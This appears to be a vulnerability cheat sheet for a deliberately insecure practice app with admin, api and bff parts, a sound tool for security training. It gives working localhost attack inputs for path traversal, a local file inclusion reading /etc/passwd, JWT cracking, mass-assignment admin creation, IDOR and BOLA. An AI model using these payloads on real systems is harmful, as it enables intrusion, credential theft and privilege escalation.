# Known vulnerabilities

### Tips for admin app

- login page always will `Username or password is incorrect` return
- 403 - `curl http://localhost/admin/123/.%2e/data` (data, help, password endpoints)
- Path traversal - `curl http://localhost/admin/123/.%2e/users`
- Path traversal - `curl http://localhost/admin/123/.%2e/configuration`
- LFI - `curl http://localhost/admin/123/.%2e/configuration?file=/../../../../../../../etc/passwd`

### Tips for api app

* You can auth from admin app creds
* JWT token is crackable by jwt-tool and common list
* `CreateUserRequest` - give possibility to create a new admin with MassAssignment `curl -X POST -d '{"username": "test1", "password": "test", "admin": true}'`
* Added `/actuator` for future secondary context findings
* Possible to BOLA on cards `/cards` PUT request 
* Excessive Data Exposure on DELETE request `/cards`

### Tips for bff app

* IDOR on orders `localhost:8085/bff/orders/{orderId}`
* Path traversal for get all users from bff to api - `localhost:8085/bff/cards?cardId=../../../../system/all/users` or `localhost:8085/bff/cards?cardId=../../../../actuator`


## TODO
- Actuator on api should be closed under httpd.
- Add README with story
- Add build FE and deploy to httpd
- Add prod docker-compose
